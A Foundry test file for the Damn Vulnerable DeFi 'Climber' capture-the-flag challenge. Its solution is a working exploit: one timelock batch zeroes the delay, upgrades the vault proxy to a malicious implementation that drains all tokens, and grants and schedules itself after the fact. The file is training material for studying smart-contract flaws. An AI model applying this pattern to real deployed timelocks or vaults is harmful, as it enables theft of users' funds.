// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {MaliciousClimber} from "../../src/climber/MaliciousClimber.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        MaliciousClimber malClimber = new MaliciousClimber();

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory calldataElements = new bytes[](4);
        bytes32 salt = bytes32("0x");

        targets[0] = address(timelock);
        values[0] = 0;
        calldataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, uint64(0));

        targets[1] = address(vault);
        values[1] = 0;
        calldataElements[1] = abi.encodeWithSelector(
            vault.upgradeToAndCall.selector,
            address(malClimber),
            abi.encodeWithSelector(
                MaliciousClimber.sendFundsToRecovery.selector, address(recovery), address(token), VAULT_TOKEN_BALANCE
            )
        );

        targets[2] = address(timelock);
        values[2] = 0;
        calldataElements[2] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(malClimber));

        targets[3] = address(malClimber);
        values[3] = 0;
        calldataElements[3] = abi.encodeWithSelector(
            malClimber.scheduleOp.selector,
            address(timelock),
            address(vault),
            address(recovery),
            address(token),
            VAULT_TOKEN_BALANCE
        );

        timelock.execute(targets, values, calldataElements, salt);

        //[
        // 0) timelock.updateDelay(0),
        // 1) vault.upgradeToAndCall(malicious, sendFundsToReocvery()),
        // 2) timelock.grantRole(PROPOSER, maliciousClimber)
        // 3) maliciousClimber.scheduleOp(...)
        //      - recreates targets, values, dataElements.
        //      - schedules it.
        //]
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
